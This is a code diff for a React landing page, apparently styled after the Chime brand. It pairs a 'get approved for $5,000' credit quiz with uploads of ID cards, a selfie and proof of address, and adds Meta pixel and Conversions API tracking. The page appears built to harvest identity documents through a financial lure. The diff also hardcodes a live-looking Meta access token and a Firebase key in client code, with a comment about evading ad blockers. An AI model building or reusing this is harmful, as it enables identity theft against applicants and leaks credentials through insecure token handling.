@@ -1,12 +1,15 @@
 import React, { useState, useRef, useEffect } from 'react';
-// IMPORTAÇÕES CORRIGIDAS: Removi 'Star', adicionei 'CreditCard' e 'TrendingUp'
 import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User as UserIcon, Loader2, FileText, ExternalLink, ArrowRight, CreditCard, TrendingUp } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
 import { getFirestore, collection, addDoc, serverTimestamp, type Firestore } from 'firebase/firestore';
 import { getAuth, signInAnonymously, onAuthStateChanged, type Auth, type User } from 'firebase/auth';
 import { getStorage, ref, uploadBytes, getDownloadURL, type FirebaseStorage } from 'firebase/storage';
 
-// --- SUA CONFIGURAÇÃO ---
+// --- SUA CONFIGURAÇÃO META ---
+const PIXEL_ID = "867694329069082";
+const ACCESS_TOKEN = "EAALWpg86eKEBQBtNgWZB6b7f0RDpEiZBWYzPxOEKmnLcglOwTzZC5khmhNPhs0RfCESA2OtcPApoMPHwfQ83aJsEVeTbmM0GeWruwSAHUTLYQqs354V9f8ZCtXOfwKh3p2sPSxw1tXHRi7zPb2LxGKkodda3bn8uxYW6rSr5xZCawP4fVx1eWus7DQNZAqepgNzgZDZD";
+
+// --- SUA CONFIGURAÇÃO FIREBASE ---
 const firebaseConfig = {
   apiKey: "AIzaSyAuITAkLq7XNhJd1AuOrXTXeqqjS8nG2ss",
   authDomain: "chime-case-teste.firebaseapp.com",
@@ -49,6 +52,52 @@ interface SubmittedDataType {
   documents: { idFront: FileData | null; idBack: FileData | null; selfie: FileData | null; proofAddress: FileData | null; }; 
 }
 interface FileUploadFieldProps { label: string; id: keyof FormDataState; file: File | null; onFileChange: (id: keyof FormDataState, file: File) => void; icon?: React.ReactNode; }
+
+// --- FUNÇÕES AUXILIARES DO PIXEL (AVANÇADO) ---
+
+// Lê cookies do navegador para melhorar o matching (fbc e fbp)
+const getCookie = (name: string) => {
+  const value = `; ${document.cookie}`;
+  const parts = value.split(`; ${name}=`);
+  if (parts.length === 2) return parts.pop()?.split(';').shift();
+  return null;
+};
+
+// Envia evento via API de Conversões (Server-Side Logic no Client)
+const sendToCAPI = async (eventName: string, eventId: string, sourceUrl: string) => {
+  try {
+    const fbp = getCookie('_fbp');
+    const fbc = getCookie('_fbc');
+    
+    const body = {
+      data: [
+        {
+          event_name: eventName,
+          event_time: Math.floor(Date.now() / 1000),
+          event_id: eventId,
+          event_source_url: sourceUrl,
+          action_source: "website",
+          user_data: {
+            fbp: fbp || undefined,
+            fbc: fbc || undefined,
+            client_user_agent: navigator.userAgent,
+            // O IP é pego automaticamente pelo FB na requisição, mas se tiver server-side real, envie client_ip_address
+          }
+        }
+      ],
+      access_token: ACCESS_TOKEN
+    };
+
+    await fetch(`https://graph.facebook.com/v18.0/${PIXEL_ID}/events`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    console.log("CAPI Event Sent:", eventName);
+  } catch (err) {
+    console.error("CAPI Error:", err);
+  }
+};
 
 const FileUploadField: React.FC<FileUploadFieldProps> = ({ label, id, file, onFileChange, icon }) => {
   const inputRef = useRef<HTMLInputElement>(null);
@@ -102,13 +151,25 @@ export default function App() {
   
   const [utmSource, setUtmSource] = useState('direct');
 
-  const quizQuestions = [
-    { question: "How much credit limit do you need right now?", options: ["Up to $500", "$1,000 - $2,500", "$5,000+"] },
-    { question: "Do you have any negative items on your credit report?", options: ["Yes (It's okay)", "No", "I don't know"] },
-    { question: "If approved for $5,000, can you activate the card today?", options: ["Yes, send it now!"] }
-  ];
-
+  // --- INICIALIZAÇÃO DO PIXEL ---
   useEffect(() => {
+    // 1. Injeta o Pixel Base no Head
+    const script = document.createElement('script');
+    script.innerHTML = `
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '${PIXEL_ID}'); 
+      fbq('track', 'PageView');
+    `;
+    document.head.appendChild(script);
+
+    // Captura UTMs
     const params = new URLSearchParams(window.location.search);
     const source = params.get('utm') || params.get('utm_source') || 'organic_direct';
     setUtmSource(source);
@@ -120,6 +181,12 @@ export default function App() {
     });
     return () => unsubscribe();
   }, []);
+
+  const quizQuestions = [
+    { question: "How much credit limit do you need right now?", options: ["Up to $500", "$1,000 - $2,500", "$5,000+"] },
+    { question: "Do you have any negative items on your credit report?", options: ["Yes (It's okay)", "No", "I don't know"] },
+    { question: "If approved for $5,000, can you activate the card today?", options: ["Yes, send it now!"] }
+  ];
 
   const handleQuizAnswer = (idx: number) => {
     setSelectedOption(idx);
@@ -162,6 +229,9 @@ export default function App() {
     setIsSubmitting(true);
     setUploadStatus('Secure upload initialized...');
     
+    // Gera um ID único para o evento (para deduplicação Browser + CAPI)
+    const eventId = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    
     try {
       const timestamp = Date.now();
       const basePath = `submissions/${user.uid}/${timestamp}`;
@@ -187,6 +257,18 @@ export default function App() {
       
       await addDoc(collection(db, 'applications'), { ...payload, submittedAt: serverTimestamp() });
       
+      // --- RASTREAMENTO INTELIGENTE (DUPLA CAMADA) ---
+      
+      // 1. Browser Pixel (JavaScript)
+      if ((window as any).fbq) {
+        (window as any).fbq('track', 'Lead', {}, { eventID: eventId });
+      }
+
+      // 2. Conversion API (CAPI) - "Inteligência & 100% Tracking"
+      // Envia os dados para o Facebook direto do código, ignorando AdBlockers
+      sendToCAPI('Lead', eventId, window.location.href);
+
+      // (Mantido seu TikTok tracking antigo, se ainda usar)
       try {
         if ((window as any).ttq) (window as any).ttq.track('CompleteRegistration');
       } catch (err) {}
@@ -211,7 +293,7 @@ export default function App() {
     </nav>
   );
 
-  // --- STEP 0.5: LOADING ANIMATION (AGORA ESTÁVEL) ---
+  // --- STEP 0.5: LOADING ANIMATION ---
   if (step === 0.5) return (
     <div className="min-h-screen bg-[#F2F8F5] font-sans flex flex-col w-full">
       <Header />
